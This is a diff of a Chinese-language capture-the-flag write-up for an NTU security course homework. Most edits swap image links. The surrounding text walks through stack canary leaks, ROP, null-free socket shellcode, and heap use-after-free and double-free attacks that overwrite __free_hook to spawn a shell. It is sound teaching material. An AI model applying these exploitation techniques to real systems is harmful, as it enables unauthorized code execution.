@@ -1,3 +1,4 @@
+# NTU CS 2023 HW3 Write Up
 ## Lab-Stackoverflow
 Flag: `flag{Y0u_know_hoW2L3@k_canAry}`
 ### 解題流程與思路
@@ -9,14 +10,13 @@ Flag: `flag{Y0u_know_hoW2L3@k_canAry}`
 
 :::info
 比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中`<do_system+115>  movaps XMMWORD PTR [rsp], xmm1`，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV
-![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_64e53f1c81b3e8060863379a0bacec31.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702578890&Signature=IDicAn54X1rs0FubPwPaAdIaap4%3D)
+![圖片](https://hackmd.io/_uploads/rJK-2d0ma.png)
 
 解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題
-![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_26cd983646f62840ecf54a76dd51ef76.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702578902&Signature=0CTmEGg1kdA8uUmXP%2B%2BgbW6D3Lc%3D)
+![圖片](https://hackmd.io/_uploads/ByhF2OCQa.png)
 
-![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2fc77ea05e8a6675599f56d3a67a2f0d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702578915&Signature=w2foaiz%2Ff3eC9%2FkRrWqRzVlDB5A%3D)
+![圖片](https://hackmd.io/_uploads/SyxvoO0Xa.png)
 :::
-
 ### Exploit - Leak Canary + Control RIP
 ```python=
 from pwn import *
@@ -104,9 +104,8 @@ Flag: `flag{Libccccccccccccccccccccccccccc}`
 
 這一題都有達成，首先題目開一個array，我們可以輸入array的index，題目會return該index的value到前端，而題目並沒有針對我的輸入進行filter或檢查，所以我可以到任意讀取，並且可以針對該index達到任意寫入(因為題目有開這樣的功能)，所以我們就可以先到處看一下輸入不同的index會吐出甚麼樣的東西
 1. 首先要知道arr在哪邊
-    ![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_6ee77bb757cca8e9dd91a400245480ed.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702578937&Signature=1lZNA2qkerzLYuI59vl1TB48hOc%3D)
+    ![image](https://hackmd.io/_uploads/HkdauHJEa.png)
     可以看到他應該在offset 0x4048的地方
-    
     ```bash
     gef➤  vmmap
     [ Legend:  Code | Heap | Stack ]
@@ -262,7 +261,7 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
     info.sin_family = PF_INET;
     info.sin_addr.s_addr = inet_addr("127.0.0.1");
     info.sin_port = htons(8765);
-    
+
     # Connect to Backend
     connect(fd, (struct sockaddr *)&info, sizeof(info))
         
@@ -270,7 +269,7 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
     struct Command cmd;
     cmd.cmd = 0x8787;
     write(fd, &cmd, sizeof(cmd));
-    
+
     # Read the result from fd
     struct Response res;
     read(fd, $rsp, sizeof(res);
@@ -282,41 +281,38 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
     
     我是直接用[godbolt](https://godbolt.org/)搭配[x86-64 disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)
     :::spoiler godbolt Result
-    ![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_c96e704ebf8f64c1e6ea9ca3a0080ef9.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702578991&Signature=WuQvqE0eFqEPcGh5XK0TCEe1Jio%3D)
+    ![image](https://hackmd.io/_uploads/B1hxShgL6.png)
     :::
     不過正如@cs-otaku說的
-    
     > 寫入content是用write去寫的。所以shellcode裡面不可以出現\x00這種東西
-    
+
     所以我也是邊參考disassembly的結果慢慢看中間有沒有\x00的byte，如果有就要想其他的payload替換掉
     
     1. Socket Config
         像是這邊我不知道`AF_INET`所代表的byte是多少就可以直接看godbolt的結果，另外syscall要用哪一個可以參考[linux x86-64 syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)，並且根據calling convention把shellcode擺好，切記看完之後要看一下轉換成shellcode看有沒有\x00的byte，可以用pwntools的asm function或是直接用[x86-64 disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)都可以達到一樣的效果
-        ![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_b52ebad8a790ac285a2bb3b0e37a03b8.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579007&Signature=c9nqIdHE1MKA8WKqVZKrPt3EsCs%3D)
-        
+        ![image](https://hackmd.io/_uploads/HJUeP3lUp.png)
         ```python
         # int fd = socket(AF_INET, SOCK_STREAM, 0);
         socket = """
             xor rax, rax
             mov al, 0x29
-        
+
             xor rdi, rdi
             mov dil, 0x2
-        
+
             xor rsi, rsi
             mov sil, 0x1
-        
+
             xor rdx, rdx
-        
+
             syscall
             mov r8, rax
         """
         ```
     2. Connect
         這邊主要需要觀察protocol怎麼包，首先我們知道第一個參數是存\$rdi，也就是存上一個syscall的return value存起來的\$r8，至於\$rsi的info address，其內容應該怎麼包含甚麼呢?我們先看一下[linux x86-64 syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)中的說明
-        ![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ca1f04fea77b78f99407f27e8ca740c4.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579019&Signature=WZEN1DdcqWht3fZZS7CBqfah0pE%3D)
+        ![image](https://hackmd.io/_uploads/BktiY2e8a.png)
         他所需的是`struct sockaddr_in info;`，而實際去看看sockaddr_in會發現他的結構如下([csdn post](https://blog.csdn.net/dongyanxia1000/article/details/80683738)):
-        
         ```
         struct sockaddr_in {
                 short   sin_family;         //address family
@@ -335,18 +331,18 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
         connect = """
             xor rax, rax
             mov al, 0x2a
-        
+
             mov rdi, r8
-        
+
             mov rsi, 0xffffffffffffffff
             mov r9, 0xfeffff80c2ddfffd
             sub rsi, r9
             push rsi
             mov rsi, rsp
-        
+
             xor rdx, rdx
             mov dl, 0x10
-        
+
             syscall
         """
         ```
@@ -360,17 +356,17 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
             xor r9, r9
             mov r9w, 0x8787
             push r9
-        
+
             xor rax, rax
             mov al, 0x1
-        
+
             mov rdi, r8
-        
+
             mov rsi, rsp
-        
+
             xor rdx, rdx
             mov dl, 0xa4
-        
+
             syscall
         """
         ```
@@ -380,14 +376,14 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
         # read(fd, $rsp, sizeof(res));
         read = """
             xor rax, rax
-        
+
             mov rdi, r8
-        
+
             mov rsi, rsp
-        
+
             xor rdx, rdx
             mov dx, 0x104
-        
+
             syscall
         """
         ```
@@ -398,15 +394,15 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
         write2console = """
             xor rax, rax
             mov al, 0x1
-        
+
             xor rdi, rdi
             mov dil, 0x1
-        
+
             mov rsi, rsp
-        
+
             xor rdx, rdx
             mov dl, 0x40
-        
+
             syscall
         """
         ```
@@ -835,9 +831,9 @@ Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f
     首先，乍看之下會不知道這個洞在哪裡，不過多try幾次或是跟一下動態會發現，他做的事情會蓋到原本==n2==的數值，導致我們之後可以輸入更多的東西
     詳細來說就是:
     因為在#61的地方輸入的東西被存到local variable name，而在#63會被copy到global variable ==msg==，並且和` hachamachama`合併在一起，如果一開始我們輸入的東西是20個字元，而concatenate的` hachamachama`總共13個字元，加起來就已經是==33==個字元，但如下圖所示，msg一開始的大小就被限制在32 bytes，也就是說他會蓋到後面n2的值
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_33a1123a74680f8d51e611d6b852575d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579087&Signature=lY7tRBG4l2S7CQIQR4NH5plkttw%3D)
+    ![圖片](https://hackmd.io/_uploads/HyUsSOTBT.png)
     從下圖可以看出來，因為長度超過的關係，原本`hachamachama`的最後一個字元，也就是0x61往後蓋到n2的值，這代表我們在往後的地方可以多加利用
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_40ef358d537fec7205920c8cc30a96e1.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579098&Signature=wliNytBPqn%2FjcFBGBmHs4C15VqU%3D)
+    ![圖片](https://hackmd.io/_uploads/SJUTP_aBT.png)
 
 2. 知道漏洞在哪裡之後，我們就可以利用這個洞，把stack的東西leak出來
     ```python
@@ -848,13 +844,13 @@ Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f
     for i in range(12):
         log.info(hex(u64(result[i * 8:i * 8 + 8])))
     log.info("[-------------Stack Info-------------]")
-    
+
     canary = u64(result[7 * 8:7 * 8 + 8])
     libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80
     libc_base_addr = libc_start_main - 0x29d90 + 0x80
     main_fn_addr = u64(result[11 * 8:11 * 8 + 8])
     code_segment_base = main_fn_addr - 0x331
-    
+
     log.success(f'Canary = {hex(canary)}')
     log.success(f'libc start main base = {hex(libc_start_main)}')
     log.success(f'libc base addr = {hex(libc_base_addr)}')
@@ -892,8 +888,7 @@ Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f
     這樣最少也需要0x78的空間，比起最大值的0x61還差蠻多的，所以昨天就想了超久怎麼解決這個問題
 3. 解決空間大小的問題
     這個要回到動態實際執行的時候是怎麼呼叫的(如下圖)，這一題有趣的地方在這邊，理論上我們是回到main+291，讓他fetch n2的值給RAX，但如果我直接跳到main+298，並且利用rop把rax變大，是不是也有一樣的效果
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_6309b5258da3a7163d2d36cd515e7e95.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579114&Signature=Wu4o6mtI4Izz5lRjw4Ei9AvZskQ%3D)
-    
+    ![圖片](https://hackmd.io/_uploads/Syoe0OTHp.png)
     ```python
     extend_payload = flat(
         canary,
@@ -922,14 +917,13 @@ Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f
     因為他有開stack protection，所以一定要對好canary在stack上的位置，可以用動態去看，依照這一題的狀況，他是會在rbp+0x40的地方
 2. libc version
     這一題因為要leak libc的base address，並且利用ROP gadget達到syscall的目的，所以一定要確定remote server使用的版本是哪一個，光知道大的版本號是有可能會失敗的，因為像我local端到最後有成功，但跑在remote就爛掉了，和@david學長討論過後的結果就是libc version有問題，實際用docker去看彼此的差異就會發現，右邊是我的→22.04.3，而左邊是實際remote的docker開出來的結果→22.04.2，所以我的作法是把docker中的東西拉出來再使用，包含在local端使用以及找gadget
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2634a2a1ae8cceb9a42f07e3bec970e1.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579147&Signature=6pkhgX449%2Fhi5VKtromefGmXCZo%3D)
-    
+    ![圖片](https://hackmd.io/_uploads/ByiMMYTHa.png)
     ```bash
     $ docker cp /lib/x86_64-linux-gnu/libc.so.6 /mnt/d/Downloads/
     ```
 3. IO problem
     這個問題也是很弔詭，會發現我在最後一個send之前還有一個raw_input()，如果拿掉的話在remote一樣會爛掉，這有可能是IO之類的問題，但總之一定要加
-    :::
+:::
 ## Lab-UAF
 Flag: `flag{https://www.youtube.com/watch?v=CUSUhXqThjY}`
 ### 解題流程與思路
@@ -946,15 +940,14 @@ Flag: `flag{https://www.youtube.com/watch?v=CUSUhXqThjY}`
 ---
 根據background，我們要利用的漏洞就是最後一個，也就是利用相同的大小，把已經free掉的部分拿回來加已利用
 1. 先註冊兩個entity(0和1)，第0個是要利用的部分
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_5c802f3234d70081446b439587c75d83.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579163&Signature=zf%2FQg9%2F04TwBAgwlcKkLKS43hFo%3D)
+    ![圖片](https://hackmd.io/_uploads/ryvTkuESp.png)
 2. 把`/sh\x00`寫上entity
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_f39d12910abaffcb6656b4ce1b36f7cd.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579174&Signature=fNlCfU%2BZCJimMBdqxDOyAuZfAzg%3D)
+    ![圖片](https://hackmd.io/_uploads/S1Rmxu4Ha.png)
 3. 刪除entity 0
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_e233333ddba0543cc002f312c9454828.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579184&Signature=uZ8sXBzybgIJzFv2dNsIf9Hy1UU%3D)
+    ![圖片](https://hackmd.io/_uploads/HkQKxuVB6.png)
 4. 設定system的function pointer
     這要特別說明，前面三個步驟都算是正常的步驟，而如果我們設定entity的name，此時系統會malloc一塊空間寫我們輸入的entity name，以這一題來說就會是entity 0(只要大小設定的一樣就好)，因此我們可以寫入包含system address和`/sh\x00`的位置，最後再以entity 0的身分trigger該function pointer就可以拿到shell了
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_c08af845d44d5ffb783d43a594ef65a3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579197&Signature=RuEhI9cnNz0AHTPQZn0%2BRQO8g5g%3D)
-    
+    ![圖片](https://hackmd.io/_uploads/rkM7Eu4r6.png)
     ```bash
     gef➤  x/gx 0x00007f706a449d70
     0x7f706a449d70 <__libc_system>: 0x74ff8548fa1e0ff3
@@ -971,11 +964,10 @@ Run On Ubuntu 20.04
 這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出`__free_hook`以及`system`的位址，接著想辦法把`system`寫到`__free_hook`的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了
 #### 前置作業: Leak Libc Address
 關於這一點可以參考[如何用UAF leak libc address?](https://hackmd.io/@SBK6401/SJWc9v4Bp#%E5%A6%82%E4%BD%95%E7%94%A8UAF-leak-libc-address)，方法都一樣，首先要想辦法讓free chunk進到unsorted bin中(最簡單的方法就是設定超過0x410的空間)，接著因為malloc的時候沒有實作清空原本的資料，導致我們可以leak其中有關libc section的資訊。底下的設定意思是我們先設定三個notes，#14的意思是不要讓#13被free掉的時候被consolidate用的，接著我們把前兩個free掉，結果如下
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_455ab08ffbadd28433b962e59f4d16b3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579210&Signature=IjrdOd0bvT1I2aCTi%2FkgkG6eNG8%3D)
+![image](https://hackmd.io/_uploads/r14opZfL6.png)
 會發現#12和#13被consolidate在一起了，接著我們看其中的一些資訊
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_99731e1cf47a4dc0dc5bd8b0b45ae225.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579220&Signature=sKM4UGyOGNXU%2BbUHv5Z%2BgKeUei4%3D)
+![image](https://hackmd.io/_uploads/SJwX0-GIT.png)
 裡面確實存著libc相關的資訊，接著只要把這一塊chunk malloc出去給隨便一個note，接著讀其中的資料就可以讀出libc address了
-
 ```python
 add_note(12, 0x420)
 add_note(13, 0x420)
@@ -997,7 +989,7 @@ r.recv(0x420 - 0x8)
 ```
 #### 方法一: Double Fee
 有了libc address後，我們要想辦法把system address寫到`__free_hook`的位置，如果是要用double free的方法的話可以參考上課的講義:
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_d598bb2a40a728d3a310049068598ce4.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579234&Signature=M5joeybHkFldM8VCiGUGKO9vB5w%3D)
+![image](https://hackmd.io/_uploads/SJNM1Mf8T.png)
 
 最簡單的方法是，我把tcache填滿(一定要)，然後用free(a)→free(b)→free(a)的順序產生double free
 ```python
@@ -1012,19 +1004,19 @@ del_note(9)
 del_note(8)
 ```
 此時的heapinfo會變成:
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_56d84c590d890cce2e85e67c9bb42a57.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579244&Signature=kPJjs4dffGGkrIkdEj2wc9w9Yp0%3D)
+![image](https://hackmd.io/_uploads/H1GGgGM86.png)
 
 接著我們把tcache清空後再繼續add_note就會把fastbin的free chunk搬到tcache中
 ```python
 add_note(8, 0x18)
 ```
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_1ac11f67a6cf9e549b1328e2eeb363d3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579254&Signature=oDSHySNSWMlwdYBau5c%2FqUG06v0%3D)
+![image](https://hackmd.io/_uploads/B1ErzMM8T.png)
 
 接著我們寫free_hook address到note #8，這樣的話，tcache的順序就會變成下圖:
 ```python
 write_note(8, p64(free_hook))
 ```
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_98d6f55ca2303181cf77f3dc4918ac17.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579263&Signature=lzJm%2BVx6p072sDrRgtbY4MK2WR8%3D)
+![image](https://hackmd.io/_uploads/rktIXGMIp.png)
 
 此時我們就把free chunk變成free_hook的地址，我們只不斷的add_note，就可以把tcache的free chunk要回來進行寫入，也就是寫system address:
 ```python
@@ -1035,15 +1027,14 @@ add_note(10, 0x10)
 add_note(11, 0x10)
 write_note(11, p64(system_addr))
 ```
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_89a8e2d76347b4bd262149e342410d2a.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579278&Signature=rPq2LH%2BFt%2Bqw9am5ZmHY%2FiLS0Xo%3D)
+![image](https://hackmd.io/_uploads/SydnNzMIa.png)
 
 最後的結果如上圖，會發現note #11已經變成==0x7f900aa8ae48==，這個就是`__free_hook`的位址，進去看發現已經被我們寫入system address，這個時候我們只要把含有`/bin/sh\x00`的note #9 free掉，就可以開shell了
 #### 方法二: 一般的寫入
 這一個方法比較方便，也和double free沒關係，反正我們只要利用UAF的特性，也可以把free chunk的fd改掉，再用像前面的方法就可以開shell
 
 下面的建構就是先開兩個note，然後free掉，此時我們就可以利用UAF的漏洞把free chunk的fd改掉，結果如下圖
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_f850094b412b54f95d5505718afd90d1.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579288&Signature=OxolStOqcctfCYFxWjaX1%2Fx76xk%3D)
-
+![image](https://hackmd.io/_uploads/B1ohIMz86.png)
 ```python
 add_note(1, 0x18)
 add_note(2, 0x18)
@@ -1053,9 +1044,8 @@ write_note(1, p64(free_hook) + p64(0) * 2)
 ```
 
 接著就把`/bin/sh\x00`寫到note #2，接著就不斷add_note，把`__free_hook`的address拿到手，然後再把system address寫到`__free_hook`，最後把含有`/bin/sh\x00`的note #2 free掉，結果如下圖:
-![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_9cc9e290d12340ca5a49a3bda253e42f.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579298&Signature=leIkrTthnpe64WkOIqL59SV6V4c%3D)
+![image](https://hackmd.io/_uploads/HkGsPGfL6.png)
 從上圖得知，note #4的address已經被我們換成`__free_hook` address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了
-
 ## HW-UAF++
 Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`
 ### 解題流程與思路
@@ -1067,7 +1057,7 @@ Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`
 這一題和lab有幾個關鍵的地方不太一樣，首先他把set_name的操作併到register的地方，另外他限制註冊的entity只能有==2個==，最重要的一點是他沒有給我們heap address或system address的天大好禮，所以我們還要想一下其他的方法
 
 1. 首先，思路會是先想辦法leak libc address，並且利用像lab的方式把system function trigger起來開一個shell給我們
-   
+    
     leak libc的策略如下，就像background提到的，要leak libc就要先想辦法把chunk丟到unsorted bin中，所以大小不能太小，lab的作法是先把tcache填滿再free一個0x88(就是不會被丟到fastbin的大小)，不過因為這一題只能讓我們註冊兩個entity，所以有沒有甚麼方式是可以直接丟到unsorted bin?那就是直接註冊超過0x410的大小，這樣free的時候就會被丟到unsorted bin
     ```python
     register(0, 0x420, b'a')
@@ -1078,14 +1068,14 @@ Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`
     trigger_event(0)
     ```
     下圖為停在delete完後的結果，因為entity 1的0x420被consolidate所以沒有被顯示出來
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ca909cc5c20e0e712d456a66a0b9a55b.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579313&Signature=q%2BgBjuJnorYQHY5zjEZ8QOw6HT0%3D)
+    ![圖片](https://hackmd.io/_uploads/B1TitfiBT.png)
     而再註冊一次的意思是要把unsorted bin的空間拿回來，又因為他沒有把空間洗掉，所以我們後面再trigger的時候他會把東西印出來給我們，從下圖可以知道entity 0的name指向==0x00005575416a52c0==，也就是一開始從unsorted bin拿到的chunk address，而裡面的數值也的確還殘留
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_cc4101dfd6d7c8bfed005277f30eaa7d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579323&Signature=uY5St53HmSo8zhtlCqXa0%2BXGGSs%3D)
+    ![圖片](https://hackmd.io/_uploads/BkbTszjBp.png)
     如果實際trigger entity 0會如下圖一樣，print出name指向的東西
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_26aee6700433d51667d518ff1c6e777d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579331&Signature=CojYK%2BgXxjNzKXkpMETkeYNNC3w%3D)
+    ![圖片](https://hackmd.io/_uploads/r1gS2MjS6.png)
 2. 既然可以leak出libc的地址，當然我們也可以寫值進去，我們的目標是開一個shell，而唯一可以執行function的就是在trigger event的地方，假設我們可以寫成如下圖一樣，是不是就可以觸發shell了
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_8a6292e5cd58cfd0cc92107046187788.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579348&Signature=oFhqi2pdxJGa4X%2FqD%2FXtdu3qhd8%3D)
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_41271b50c748321a398a6287caa6235f.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579359&Signature=%2F8fy%2FNUoqZvcWDRAUUis%2BRHMq8A%3D)
+    ![圖片](https://hackmd.io/_uploads/BkDyeXoST.png)
+    ![圖片](https://hackmd.io/_uploads/ryBggQiB6.png)
 3. 要達成如上的效果，我會先reset各個entity，為甚麼要設定0x20之後會用到
     ```python
     register(0, 0x20, b'a')
@@ -1093,7 +1083,7 @@ Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`
     register(1, 0x20, b'a')
     ```
 4. 仔細看source code中註冊的部分，他一共會malloc兩個空間，一個是固定0x20的entity，另外一個就是我們自己設定的name空間，這個空間可以寫值；另外call function pointer的時候，也就是在trigger event的地方，他只會針對剛剛提到的0x20 entity space去call function，所以我們要想辦法把我們寫進去的值==被當成0x20的entity==，這樣的話就可以直接call system了，這最後一步想了超級久，原本是想隔天在戰，結果躺在床上五分鐘就來靈感了，再花五分鐘就把問題解掉了😑
-   
+    
     具體流程如下
     ```python
     delete(1)
@@ -1102,8 +1092,8 @@ Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`
     trigger_event(1)
     ```
     首先把這兩個entity都free掉，這樣回收區就會如下圖一樣
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_c9f6d767fb8b766342cd342fa1fcd29d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579370&Signature=bn3PpfehguOLFChNqkUiK5HPsJc%3D)
+    ![圖片](https://hackmd.io/_uploads/B1fdM7iHT.png)
     接著我們註冊entity 0，又因為這一次要的空間是0x18，所以他會把前面entity 1的空間都拿回來使用，如果我們又把開shell的資訊寫進去，就會如下圖
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_715e9d5fba779b5e149238a54e3311b3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579391&Signature=bQhTlSaYZ2s%2F6dlr62SRcwzMX4M%3D)
+    ![圖片](https://hackmd.io/_uploads/Sk6GXXoS6.png)
     此時原本被free掉的entity 1的空間就會變成entity 0的name space，此時我們只要trigger entity 1就會開shell了，如下圖
-    ![圖片](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_21db095df99fb53ef7fc2c0a05840c0d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702579380&Signature=wTy4V3yga7P8LWuZEq1bdroEBWQ%3D)
+    ![圖片](https://hackmd.io/_uploads/ByhCXQjrT.png)
